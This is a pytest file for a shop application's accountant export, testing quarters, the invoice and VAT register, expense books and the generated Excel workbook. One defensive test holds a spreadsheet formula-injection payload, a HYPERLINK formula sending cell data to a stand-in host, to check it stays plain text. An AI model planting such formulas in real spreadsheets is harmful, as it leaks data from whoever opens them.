"""The gestoría export: register of invoices issued, VAT summary and the Excel file."""

from datetime import date, datetime
from io import BytesIO

import pytest

from core.accounting import quarter


@pytest.fixture
def store(make_store):
    s = make_store()
    s.load_preset("retail", with_demo_sales=False)
    s.save_settings({"tax_id": "B12345674", "address": "Calle Mayor 1, Madrid", "business_name": "Tienda Sol"})
    for pid in s.promotions()["id"]:
        s.delete_promotion(int(pid))
    return s


def _pid(store, sku):
    df = store.products()
    return int(df.loc[df["sku"] == sku, "id"].iloc[0])


def test_quarters():
    assert quarter(date(2026, 2, 14)) == (date(2026, 1, 1), date(2026, 4, 1))
    assert quarter(date(2026, 11, 3)) == (date(2026, 10, 1), date(2027, 1, 1))


def test_register_of_invoices_issued(store):
    cam, cin = _pid(store, "CAM-001"), _pid(store, "CIN-005")
    store.update_product(cin, {"tax_rate": 10.0})  # a second VAT rate
    store.adjust_stock(cam, 500)
    day = datetime(2026, 10, 5, 10, 0)
    t1 = store.create_sale([{"product_id": cam, "quantity": 1}], "Tarjeta", when=day)
    t2 = store.create_sale([{"product_id": cam, "quantity": 2}, {"product_id": cin, "quantity": 1}], "Efectivo",
                           when=day.replace(hour=11))
    big = store.create_sale([{"product_id": cam, "quantity": 200}], "Tarjeta", when=day.replace(hour=12))
    invoiced = store.create_sale([{"product_id": cam, "quantity": 1}], "Tarjeta", when=day.replace(hour=13))
    voided = store.create_sale([{"product_id": cam, "quantity": 1}], "Tarjeta", when=day.replace(hour=14))
    store.cancel_sale(voided["id"])
    invoice = store.create_invoice(invoiced["id"], {"name": "Norte S.L.", "tax_id": "A58818501", "address": "C/ 1"},
                                   when=day.replace(hour=15), irpf_rate=15)
    store.create_refund(t2["id"], {store.sale(t2["id"])["items"][0]["id"]: 1}, "Efectivo", "Talla",
                        when=day.replace(day=6))
    note = store.create_refund(invoiced["id"], {store.sale(invoiced["id"])["items"][0]["id"]: 1}, "Efectivo",
                               "Defectuoso", when=day.replace(day=7))

    book, voided_list = store.issued_book(date(2026, 10, 1), date(2027, 1, 1))
    kinds = list(book["Tipo"].str[:2])
    assert kinds.count("F2") == 3  # big ticket alone + daily summary at 21 % + daily summary at 10 %
    summary21 = book[(book["Tipo"].str.startswith("F2 · Resumen")) & (book["Tipo IVA %"] == 21.0)].iloc[0]
    assert summary21["Número"] == f"{t1['number']} a {t2['number']}" and summary21["Nº tickets"] == 2
    alone = book[book["Número"] == big["number"]].iloc[0]
    assert alone["Total"] == pytest.approx(float(big["total"])) and float(big["total"]) > 3000
    f3 = book[book["Tipo"].str.startswith("F3")]
    assert list(f3["Número"]) == [invoice["number"]] and f3.iloc[0]["NIF destinatario"] == "A58818501"
    assert f3.iloc[0]["Retención IRPF"] == pytest.approx(float(invoice["irpf_amount"]))
    assert invoiced["number"] not in set(book["Número"])  # replaced by its invoice: counted once
    r1 = book[book["Tipo"].str.startswith("R1")].iloc[0]
    assert r1["Número"] == note["credit_note"]["number"] and r1["Total"] < 0
    r5 = book[book["Tipo"].str.startswith("R5")].iloc[0]
    assert r5["Total"] < 0 and t2["number"] in r5["Observaciones"]
    assert list(voided_list["Número"]) == [voided["number"]] and voided["number"] not in set(book["Número"])

    # Everything sold and not voided, minus returns, is in the book, to the cent.
    sold = sum(float(s["total"]) for s in (t1, t2, big, invoiced))
    returned = float(store.refunds()["total"].sum())
    assert book["Total"].sum() == pytest.approx(sold - returned, abs=0.01)
    vat = store.vat_summary(book)
    assert set(vat["Tipo IVA %"]) == {21.0, 10.0}
    assert vat["Cuota IVA"].sum() == pytest.approx(book["Cuota IVA"].sum(), abs=0.001)


def test_excel_for_the_gestoria(store):
    from openpyxl import load_workbook

    store.create_sale([{"product_id": _pid(store, "CAM-001"), "quantity": 1}], "Tarjeta",
                      when=datetime(2026, 10, 5, 10))
    store.add_expense(date(2026, 10, 6), "Alquiler", "Local octubre", 900.0)
    store.add_expense(date(2026, 10, 7), "Suministros", "Luz de septiembre", 121.0, invoice_number="F-2026-881",
                      issuer_tax_id="a81948077", issuer_name="Eléctrica S.A.", tax_rate=21)
    received = store.received_book(date(2026, 10, 1), date(2027, 1, 1))
    assert len(received) == 1  # only expenses with the supplier's invoice
    luz = received.iloc[0]
    assert (luz["Base imponible"], luz["Cuota IVA"], luz["NIF proveedor"]) == (100.0, 21.0, "A81948077")
    with pytest.raises(ValueError):
        store.add_expense(date(2026, 10, 7), "Suministros", "x", 10.0, tax_rate=7)
    data = store.gestoria_workbook(date(2026, 10, 1), date(2027, 1, 1))
    wb = load_workbook(BytesIO(data))
    assert wb.sheetnames == ["Resumen", "Facturas expedidas", "Facturas recibidas", "Tickets anulados", "Gastos"]
    cells = [c.value for row in wb["Resumen"].iter_rows() for c in row]
    assert "Tienda Sol" in cells and "B12345674" in cells and "01/10/2026 a 31/12/2026" in cells
    assert cells[cells.index("IVA soportado en facturas recibidas") + 1] == 21.0
    assert wb["Facturas expedidas"]["A1"].value == "Fecha expedición"
    gastos = [(r[0].date(), r[2], r[4]) for r in wb["Gastos"].iter_rows(min_row=2, values_only=True)]
    assert (date(2026, 10, 6), "Alquiler", 900) in gastos and len(gastos) == 2


def test_excel_keeps_formula_looking_text_as_text(store):
    """A supplier or concept typed as «=HYPERLINK(…)» must not run when the accountant opens the book."""
    from openpyxl import load_workbook

    trap = '=HYPERLINK("http://ejemplo.invalid/robar?d="&A1,"Ver")'
    store.add_expense(date(2026, 10, 6), "Alquiler", trap, 90.0, invoice_number="F-1",
                      issuer_tax_id="a81948077", issuer_name="@SUM(1)", tax_rate=21)
    wb = load_workbook(BytesIO(store.gestoria_workbook(date(2026, 10, 1), date(2027, 1, 1))))
    cells = [c for ws in wb.worksheets for row in ws.iter_rows() for c in row if c.value is not None]
    assert not [c.coordinate for c in cells if c.data_type == "f"]
    assert trap in [c.value for c in cells]  # still readable, exactly as typed
